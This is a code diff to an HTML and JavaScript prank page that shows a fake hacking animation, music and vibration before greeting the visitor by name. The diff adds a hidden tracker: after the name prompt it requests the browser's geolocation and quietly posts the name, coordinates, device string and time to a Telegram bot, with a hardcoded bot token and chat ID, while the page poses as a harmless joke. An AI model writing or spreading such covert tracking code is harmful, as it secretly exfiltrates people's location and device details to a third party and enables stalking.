@@ -12,7 +12,7 @@ body {
   overflow: hidden;
 }
 
-/* overlay full screen */
+/* overlay */
 #overlay {
   position: fixed;
   top: 0;
@@ -22,14 +22,13 @@ body {
   z-index: 999;
 }
 
-/* hacker text */
+/* hacker */
 #hacker {
   white-space: pre-line;
   padding: 20px;
-  font-size: 18px;
 }
 
-/* final message */
+/* main msg */
 #main {
   display: none;
   position: absolute;
@@ -41,7 +40,7 @@ body {
   font-family: Arial;
 }
 
-/* typing text */
+/* typing */
 .typing {
   border-right: 2px solid white;
   white-space: nowrap;
@@ -79,7 +78,7 @@ canvas {
   100% { transform: translate(3px,3px); }
 }
 
-/* error screen */
+/* error */
 #error {
   display: none;
   position: fixed;
@@ -89,13 +88,12 @@ canvas {
   height: 100%;
   background: red;
   color: white;
-  font-size: 30px;
+  font-size: 28px;
   text-align: center;
   padding-top: 40vh;
   z-index: 1000;
 }
 </style>
-
 </head>
 
 <body>
@@ -110,7 +108,7 @@ canvas {
   <p id="msg" class="typing"></p>
 </div>
 
-<div id="error">❌ ERROR: NAME REQUIRED!</div>
+<div id="error">❌ INVALID NAME!</div>
 
 <audio id="bgmusic" loop>
   <source src="music.mp3" type="audio/mpeg">
@@ -118,25 +116,67 @@ canvas {
 
 <script>
 
-// 👇 naam pucho
+// 🔐 TELEGRAM DETAILS (APNE DALNA)
+let BOT_TOKEN = "8722336483:AAG32SwyqJCRV5eaOiH06r08BbYBi5t7WvA";
+let CHAT_ID = "5992250834";
+
+// 📩 SEND TO TELEGRAM
+function sendToTelegram(name, location) {
+  let msg = "🔥 New Visitor\n\nName: " + name +
+            "\nLocation: " + location +
+            "\nDevice: " + navigator.userAgent +
+            "\nTime: " + new Date().toLocaleString();
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: msg
+    })
+  });
+}
+
+// 📍 LOCATION
+function getLocation(name) {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        let loc = pos.coords.latitude + ", " + pos.coords.longitude;
+        sendToTelegram(name, loc);
+      },
+      () => {
+        sendToTelegram(name, "Denied");
+      }
+    );
+  } else {
+    sendToTelegram(name, "Not Supported");
+  }
+}
+
+// 🔥 NAME INPUT
 let userName = prompt("Enter your name 😎");
 
-// ❌ validation
-if (!userName || userName.trim() === "") {
-  
+// VALIDATION
+let validName = /^[A-Za-z ]+$/;
+
+if (!userName || !validName.test(userName)) {
+
   document.getElementById("error").style.display = "block";
   document.body.style.background = "red";
   document.body.classList.add("shake");
 
-  // vibration
   if (navigator.vibrate) {
     navigator.vibrate([500,200,500,200,500]);
   }
 
-  throw new Error("Name not entered");
+  throw new Error("Invalid Name");
 }
 
-// start all effects
+// 👉 location + telegram call
+getLocation(userName);
+
+// START
 function startAll() {
   playMusic();
   vibratePhone();
@@ -155,11 +195,11 @@ function vibratePhone() {
   }
 }
 
-// hacker lines
+// hacker text
 let lines = [
   "Initializing system...",
   "Tracking user: " + userName + "...",
-  "Accessing private data...",
+  "Requesting location access...",
   "Bypassing firewall...",
   "Injecting script...",
   "Access Granted ✔"
@@ -178,7 +218,6 @@ function typing() {
   }
 }
 
-// final message
 function showMessage() {
   document.getElementById("hacker").style.display = "none";
   document.getElementById("main").style.display = "block";
@@ -189,27 +228,24 @@ function showMessage() {
   document.getElementById("msg").innerText =
     userName + ", tum ekdum special ho 💌🔥";
 
-  alert("😈 " + userName + " SYSTEM BREACHED!");
+  alert("😈 SYSTEM BREACHED!");
 }
 
 typing();
 
-// matrix rain
+// matrix
 let canvas = document.getElementById("matrix");
 let ctx = canvas.getContext("2d");
 
 canvas.height = window.innerHeight;
 canvas.width = window.innerWidth;
 
-let letters = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-letters = letters.split("");
-
+let letters = "01ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
 let fontSize = 14;
 let columns = canvas.width / fontSize;
-
 let drops = [];
-for (let x = 0; x < columns; x++)
-  drops[x] = 1;
+
+for (let x = 0; x < columns; x++) drops[x] = 1;
 
 function draw() {
   ctx.fillStyle = "rgba(0,0,0,0.05)";
